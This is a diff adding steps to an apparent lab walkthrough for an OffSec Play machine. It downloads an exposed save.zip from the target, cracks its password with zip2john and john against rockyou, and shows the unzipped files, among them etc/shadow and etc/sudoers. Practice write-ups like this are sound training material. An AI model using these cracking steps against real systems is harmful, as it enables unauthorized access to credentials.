@@ -136,3 +136,40 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 12.74 seconds
 ```
+
+```http
+http://192.168.224.85/
+```
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/88c19013-ae23-4dc3-a70b-e07b36990ac0)
+```http
+http://192.168.224.85/save.zip
+```
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/82622edc-9a9b-4ae1-adc5-e7b5a0fe05e3)
+
+Crack Zipped File
+```shell
+> zip2john save.zip > save.hash
+```
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/2894c428-e5bd-4ece-9925-4ac9c70cd115)
+
+```shell
+> john --wordlist=/usr/share/wordlists/rockyou.txt save.hash
+```
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/2f656a59-911a-4b4f-a321-0a14c05dee0c)
+
+```shell
+password: manuel
+```
+
+```shell
+> unzip save.zip
+Archive:  save.zip
+[save.zip] etc/passwd password: 
+  inflating: etc/passwd              
+  inflating: etc/shadow              
+  inflating: etc/group               
+  inflating: etc/sudoers             
+  inflating: etc/hosts               
+ extracting: etc/hostname 
+```
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/38b6d12f-3694-4011-a620-da98b6396005)
